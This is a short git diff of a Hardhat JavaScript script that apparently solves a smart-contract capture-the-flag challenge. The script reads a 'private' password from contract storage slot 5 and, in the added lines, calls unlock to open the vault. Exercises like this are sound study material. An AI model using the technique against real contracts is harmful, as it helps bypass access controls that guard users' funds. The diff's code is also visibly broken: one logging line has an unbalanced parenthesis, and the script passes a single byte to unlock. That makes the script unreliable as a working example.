@@ -9,15 +9,15 @@ const main = async () => {
   console.log(`Delegate contract: ${privacyContract.address}`);
 
   let txn1 = await provider.getStorageAt(privacyContract.address, 5);
-  console.log(`Password aquired: ${(hre.ethers.utils.arrayify(txn1).then((result) => {return result[2]}))}`);
+  console.log(`Password aquired: ${(hre.ethers.utils.arrayify(txn1)}`);
 
-  let password = hre.ethers.utils.toUtf8String(txn1)
+  let password = hre.ethers.utils.arrayify(txn1);
   console.log("Password stored")
 
-  /*let txn2 = await privacyContract.unlock(txn1);
+  let txn2 = await privacyContract.unlock(password[2]);
   console.log("Unlocking...")
   await txn2.wait();
-  console.log("Vault unlocked.")*/
+  console.log("Vault unlocked.")
 }
 
 const runMain = async () => {
